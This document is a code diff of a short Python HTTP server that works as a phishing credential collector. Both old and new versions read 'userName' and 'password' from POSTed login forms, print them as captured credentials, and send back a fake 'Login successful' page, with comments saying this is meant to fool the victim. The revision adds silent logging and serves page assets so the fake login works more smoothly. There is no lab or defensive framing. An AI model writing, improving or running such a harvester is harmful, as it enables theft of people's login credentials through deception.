@@ -1,34 +1,36 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
 
-class PostHandler(BaseHTTPRequestHandler):
+class LoggingHandler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # Respond with a simple dummy page (optional)
+        # Just respond OK for any GET requests (CSS, images, favicon)
         self.send_response(200)
-        self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(b"<html><body>Login successful (simulated)</body></html>")
-
+    
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
-        parsed = urllib.parse.parse_qs(post_data)
+        # Read the posted form data
+        length = int(self.headers['Content-Length'])
+        body = self.rfile.read(length).decode('utf-8')
+        data = urllib.parse.parse_qs(body)
         
-        # Extract username and password (adjust field names if needed)
-        username = parsed.get('userName', [''])[0]
-        password = parsed.get('password', [''])[0]
+        username = data.get('userName', [''])[0]
+        password = data.get('password', [''])[0]
         
-        print(f"\n[!] Credentials captured:")
+        print(f"\n[!] Captured credentials:")
         print(f"Username: {username}")
         print(f"Password: {password}\n")
         
-        # Send a fake success response back to the victim
+        # Send a fake success response so the victim thinks login worked
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(b"<html><body>Login successful, redirecting...</body></html>")
+        self.wfile.write(b"<html><body>Login successful (redirecting...)</body></html>")
+    
+    def log_message(self, format, *args):
+        # Suppress verbose logging (optional)
+        pass
 
 if __name__ == '__main__':
-    server = HTTPServer(('0.0.0.0', 8000), PostHandler)
-    print("Listening on port 8000...")
+    server = HTTPServer(('0.0.0.0', 8000), LoggingHandler)
+    print("[*] Listening on port 8000 - waiting for POST with credentials...")
     server.serve_forever()
